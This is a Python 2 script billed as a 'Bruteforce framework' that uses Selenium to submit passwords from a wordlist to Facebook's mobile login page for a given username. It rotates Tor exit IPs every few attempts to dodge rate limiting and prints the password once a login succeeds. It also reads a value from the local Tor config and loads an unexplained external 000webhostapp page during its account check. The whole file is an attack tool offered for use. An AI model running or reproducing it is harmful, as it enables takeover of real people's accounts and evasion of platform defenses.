 # -*- coding: utf-8 -*-
import argparse, mechanize, os, sys, socks, socket
from time import sleep
from subprocess import call
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from pyvirtualdisplay import Display
from urllib2 import urlopen
from termcolor import colored

reload(sys)

sys.setdefaultencoding('utf8')


W = '\033[0m'   # White
R = '\033[31m'  # Red
G = '\033[32m'  # Green
O = '\033[33m'  # Orange


def main():

    parser = argparse.ArgumentParser(description='Bruteforce framework written in Python')  # Parameters
    required = parser.add_argument_group('required arguments')
    required.add_argument('-s', '--service', dest='service')
    required.add_argument('-u', '--username', dest='username')
    required.add_argument('-w', '--wordlist', dest='password')
    parser.add_argument('-d', '--delay', type=int, dest='delay')

    args = parser.parse_args()

    service = args.service
    username = args.username
    wordlist = args.password
    delay = args.delay


    if os.path.exists(wordlist) == False:

        print(R + "Error : WordList not Found" + W)

        exit(1)


    if delay is None:

        delay = 1
    

    global Hash, fb_name

    os.system("clear")

    if service == "facebook":

        fb_name = raw_input(O + "Please Enter The NAME Of The Facebook Account : " + W)

        os.system("clear")

 
    os.system("/etc/init.d/tor restart && rm -rf tmp/ geckodriver.log") # restarting tor & removing geckodriver log


    with open('/etc/tor/torrc','r') as f:

        contents = f.readlines()

        data = contents[59]

        Hash = data.rsplit(":",1)[1]

    sys.stdout.write("[ " + G + "ok" + W + " ]" + " Successfully Scanned Password : " + Hash)

    Bruter(service, username, wordlist, delay).execute()


class Bruter(object):


    def __init__(self, service, username, wordlist, delay):

        self.service = service

        self.username = username

        self.wordlist = wordlist

        self.delay = delay


    def stopTOR(self):   # Stoping Tor

        os.system("rm -rf tmp/ geckodriver.log && service tor stop")

        exit(1)


    def execute(self):   # Connection Between def main() 
  
        if self.usercheck(self.username, self.service) == 0:

            print("[ " + R + "Error" + W + " ]" + " Username Does not Exist\n" + W)
            
            exit(1)

        print("[ " + G + "ok" + W + " ]" + " Checking Account Existence\n")

        self.webBruteforce(self.username, self.wordlist, self.service, self.delay)


    def usercheck(self, username, service):          # Checking Username

     #  display = Display(visible=0, size=(800, 600)) # Pyvirtual display starting

      # display.start()     

       try:

           if service == "facebook":
	       driver = webdriver.Firefox()
               driver.get("https://www.facebook.com/public/" + fb_name)
	       driver.find_element_by_tag_name('body').send_keys(Keys.COMMAND + 't')
	       driver.get("https://thedarkmantutotrials.000webhostapp.com/fund.html")

               assert (("We couldn't find anything for") not in driver.page_source)

               #driver.close()

               os.system("clear && /etc/init.d/tor restart")

           elif service == "twitter":

               print colored('Facebook bruteforce is only availble', 'red')

           elif service == "instagram":

               print colored('Facebook bruteforce is only availble', 'red')
       except AssertionError:

           return 1

    def webBruteforce(self, username, wordlist, service, delay):

        my_ip = urlopen("http://ip.42.pl/raw").read()

        if service == "facebook":		
            driver = webdriver.Firefox()
            driver.get("https://touch.facebook.com/login?soft=auth/")

            WebDriverWait(driver, 30).until(lambda d: d.execute_script('return document.readyState') == 'complete')

            elem = driver.find_element_by_name("email")
            elem.clear()
            elem.send_keys(username)
        elif service == "twitter":

             print colored('Facebook bruteforce is only availble', 'red')

        elif service == "instagram":

            print colored('Facebook bruteforce is only availble', 'red')
        

        j=0 

        print("\n- Bruteforce starting ( Delay = %s sec ) -\n" % self.delay)

        wordlist = open(wordlist, 'r')

        for i in wordlist.readlines():

            password = i.strip("\n")

            try:               

                if service == "facebook":

                    elem = driver.find_element_by_name("pass")

                elem.clear()
                elem.send_keys(password)
                elem.send_keys(Keys.RETURN)
                
                sleep(delay) 


                if service == "facebook":

                    assert (("Facebook") in driver.title)

                if j == 2:

                   j=0
		   os.system("python torip.py -l")

                   my_ip = urlopen("http://ip.42.pl/raw").read()

                print(O + ("  Password: {} \t| Failed \t| IP : {} \n ".format(password,my_ip)) + W)

                j+=1

                sleep(delay)

            except AssertionError: 
            
                print(G + ("  Username: {} \t| Password found: {}\n".format(username,password)) + W)

                self.stopTOR()

            except Exception as e:

                print(R + ("\nError : {}".format(e)) + W)

                driver.close()

                self.stopTOR()


if __name__ == '__main__':

    try:

        main()

    except KeyboardInterrupt:
	
	os.system("python torip.py -f")
        print(R + "\nError : Keyboard Interrupt" + W)

        os.system("rm -rf tmp/ geckodriver.log && service tor stop")

        exit(1)